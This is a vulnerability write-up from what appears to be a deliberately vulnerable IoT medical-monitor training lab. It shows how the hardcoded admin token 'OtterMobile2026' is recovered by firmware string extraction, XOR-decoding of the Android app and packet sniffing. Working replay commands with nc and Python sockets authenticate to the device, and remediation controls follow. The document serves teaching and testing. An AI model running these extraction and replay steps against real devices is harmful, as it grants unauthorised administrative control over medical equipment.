---
id: IGP-01
title: "Hardcoded Credential (`OtterMobile2026`)"
category: IoT
status: DONE
severity: Critical
owasp: "IoT I1 — Weak, Guessable, or Hardcoded Passwords"
cwe: "CWE-798 (Hardcoded Credentials)"
source_docs:
  - "CareOtter_Test_Suite.md §IGP-01"
  - "CareOtter.md Vuln #1"
  - "CareOtter_IoT.md §IoT:I1"
affected_components:
  - "labs/careotter/careservice.c"
  - "vulnzoo_apps/careotter_app/app/src/main/java/.../IgpClient.java"
verified_date: "2026-05-02"
---

# IGP-01 — Hardcoded Credential (`OtterMobile2026`)

> **Status:** DONE
> **Source docs:** `CareOtter_Test_Suite.md` §IGP-01, `CareOtter.md` Vuln #1, `CareOtter_IoT.md` §IoT:I1  
> **OWASP:** IoT I1 — Weak, Guessable, or Hardcoded Passwords  
> **CWE:** CWE-798 (Hardcoded Credentials)  
> **Severity:** Critical

---

## Why It Matters

The `careservice` daemon stores the administrator token as a literal string in its source code. When compiled, that string lands in the `.rodata` section of the ELF binary, visible to anyone who inspects the firmware. This turns the credential into a **universal master key**: a single token opens all CareOtter devices in the world, regardless of hospital, patient, or country. Unlike a user password, it cannot be changed from the clinical interface, rotated by IT, or revoked when a technician leaves the company. An attacker who possesses it can read the WiFi configuration, restart services, trigger simulated therapies, or inject shell commands, all without leaving an audit trail.

Because the `authenticated` flag in `careservice` is global and never expires, a single successful `AUTH_SUCCESS` obtained by any path below inherits the privilege for every subsequent TCP connection until the daemon restarts (see IGP-06).

---

## Root Cause

```c
// labs/careotter/careservice.c
#define ADMIN_TOKEN "OtterMobile2026"
```

The token is compiled into the binary and appears in plaintext in the `.rodata` section. The authentication routine compares the payload of IGP command `0x02` against this compile-time constant using `strncmp()`, with no hashing, no salt, and no per-device derivation.

---

## How an Attacker Obtains It

No sophisticated laboratory is needed. The token leaks through everyday channels:

| Path                            | Tool                                               | Evidence                                                       |
| ------------------------------- | -------------------------------------------------- | -------------------------------------------------------------- |
| **A — Firmware strings**        | `strings /opt/careservice/careservice \| grep Otter` | `OtterMobile2026` in plaintext                                 |
| **B — APK reverse engineering** | `jadx`, single-byte XOR decode                     | XOR-obfuscated token (key `0x5A`) decodes to the same string   |
| **C — Passive network capture** | `tcpdump -i any -w careotter.pcap 'tcp port 9999'` | Token visible in every AUTHENTICATE frame                      |
| **D — Cloud API error oracles** | Trigger verbose error paths (API-03, API-04)       | Raw IGP frames or stack traces leak the magic + opcode mapping |

---

## Path A — Firmware Strings

The most direct route when the attacker has, or can obtain, the binary (SD-card extraction, physical access, a leaked OTA, or chained shell from another vulnerability such as BLE-11 or IGP-05):

```bash
strings /opt/careservice/careservice | grep -i otter
# → OtterMobile2026
```

The same strings run also reveals the IGP magic (`CARE`) and response literals (`AUTH_SUCCESS`, `AUTH_FAIL`, `GET_NETWORK`, `DEAUTH_OK`), making the protocol self-documenting.

---

## Path B — Android APK Reverse Engineering

The patient application ships the protocol description and the **XOR-obfuscated** admin token in the DEX. Anyone who can install the APK can extract both without ever touching the monitor.

### 1. Decompile the APK

> **IMPORTANT:** On Kali the `jadx` wrapper does `cd /usr/share/jadx/bin` before exec, so a relative path resolves wrong. Always pass an absolute path:

```bash
jadx "$PWD/careotter_app.apk" -d "$PWD/out"
```

### 2. Recover the IGP header layout and opcode table

```bash
grep -rnE "IGP_MAGIC|0x43415245|9999|CMD_" out/sources/com/vulnzoo/
```

**Expected hits:**
```
IgpClient.java: private static final int IGP_MAGIC = 1128354373;  // 0x43415245
IgpClient.java: // [Magic(4)=0x43415245 "CARE"] [Cmd(1)] [Status(1)=0x00] [Len(2)]
IgpClient.java: public static final byte CMD_AUTHENTICATE  = 0x02;
IgpClient.java: public static final byte CMD_DEAUTHENTICATE = 0x0D;
```

> Note: jadx normalises int literals to decimal — `printf '%x\n' 1128354373` → `43415245`

### 3. Recover the cleartext token

The admin token is not a plaintext string in the APK; a single-byte XOR with key `0x5A` trivially reverses it:

```java
// VULNERABILITY: admin token XOR-obfuscated with key 0x5A
private static final byte[] ENCODED_TOKEN = {
    0x15, 0x2E, 0x2E, 0x3F, 0x28, 0x17, 0x35, 0x38,
    0x33, 0x36, 0x3F, 0x68, 0x6A, 0x68, 0x6C
};
```

```bash
python3 -c '
enc = [0x15,0x2E,0x2E,0x3F,0x28,0x17,0x35,0x38,0x33,0x36,0x3F,0x68,0x6A,0x68,0x6C]
print(bytes(b ^ 0x5A for b in enc).decode())'
# → OtterMobile2026
```

The key (`0x5A`) is stored next to the ciphertext, so the obfuscation provides no security — CWE-656 (Reliance on Security Through Obscurity).

---

## Path C — Passive Network Capture

The IGP channel is plaintext TCP. An attacker on the same broadcast domain — or after a trivial ARP-spoof on the `192.168.2.0/24` segment — sniffs a single legitimate admin login and recovers the token:

```bash
sudo tcpdump -i any -w careotter.pcap 'tcp port 9999'
```

What a login packet looks like in hex:

```
43 41 52 45  02  00  00 0F   4F 74 74 65 72 4D 6F 62 69 6C 65 32 30 32 36
└─ "CARE" ─┘ cmd  st  len     └────────── "OtterMobile2026" ─────────────┘
```

Because the protocol is unencrypted and stateless (except for the global `authenticated` flag), replay is immediate with any TCP client:

```bash
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc 192.168.2.1 9999
# → AUTH_SUCCESS
```

---

## Path D — Cloud API Error Oracle

The Flask Cloud API on `:5002` proxies a subset of IGP commands. Triggering verbose error paths (API-03 format-string leak, API-04 Flask debug traceback, oversized-parameter `IGPError`) frequently echoes raw IGP frames or `careservice` stack traces into the HTTP response. This does not directly leak the token, but it confirms the IGP header layout (`[Magic(4)][Cmd(1)][Status(1)][Len(2)]`) and opcode mapping without ever opening a TCP socket to port `9999`. Once the protocol is mapped, the attacker authenticates using the token recovered from any of the paths above.

See API-03 and API-04 for detailed exploitation of those error channels.

---

## Steps to Reproduce

```bash
# Method A: static extraction from binary
strings /opt/careservice/careservice | grep -i otter

# Method B: direct test via IGP (Python helper)
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.2.1", 9999))
p = b"OtterMobile2026"
s.sendall(struct.pack(">IBBH", 0x43415245, 2, 0, len(p)) + p)
print(s.recv(1024))'
# → b"AUTH_SUCCESS"

# Method C: incorrect token (negative control)
python3 -c '
import socket, struct
s = socket.create_connection(("192.168.2.1", 9999))
p = b"WrongToken123"
s.sendall(struct.pack(">IBBH", 0x43415245, 2, 0, len(p)) + p)
print(s.recv(1024))'
# → b"AUTH_FAIL"

# Method D: pure shell (no Python)
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026' | nc 192.168.2.1 9999
# → AUTH_SUCCESS
```

---

## How It Should Be

A secure design completely eliminates the notion of a "universal factory password." Each monitor should derive its administrative credentials from a **unique hardware-bound secret** — stored in a TPM, Secure Element, or eFuses — combined with its own device identifier (MAC or serial number) via a key derivation function (KDF). The token would never travel over the network in plaintext; instead, the IGP v4 protocol should use **challenge-response** with the hardware secret, so that not even the legitimate administrator knows the underlying key. Sessions should expire after a period of inactivity (for example, fifteen minutes), and each authentication attempt should be logged with timestamp, source IP, and result.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Hardware | TPM / Secure Element / eFuses | Store the derivation secret in a non-exportable manner |
| Firmware | Derive token at runtime with HKDF | Prevent the final credential from appearing in the binary |
| Network | TLS 1.3 with per-device X.509 certificate | Encrypt the management channel and mutually authenticate |
| Authentication | HMAC-SHA256 challenge-response | Eliminate sending of static tokens over the network |
| Active protection | Rate limiting (5 attempts → 5 min lock) | Make brute-force infeasible |
| Auditing | Immutable log of every attempt and command | Detect unauthorized use and enable forensics |

---

## Verification Checklist

- [ ] `strings careservice | grep Otter` returns `OtterMobile2026`
- [ ] Correct token via IGP `0x02` returns `AUTH_SUCCESS`
- [ ] Incorrect token via IGP `0x02` returns `AUTH_FAIL`
- [ ] XOR decode of `ENCODED_TOKEN` in APK yields `OtterMobile2026`
- [ ] `tcpdump` of port 9999 reveals the token in plaintext during AUTHENTICATE

---

## References

- `CareOtter_Test_Suite.md` §IGP-01
- `CareOtter.md` Vuln #1
- `CareOtter_IoT.md` §IoT:I1
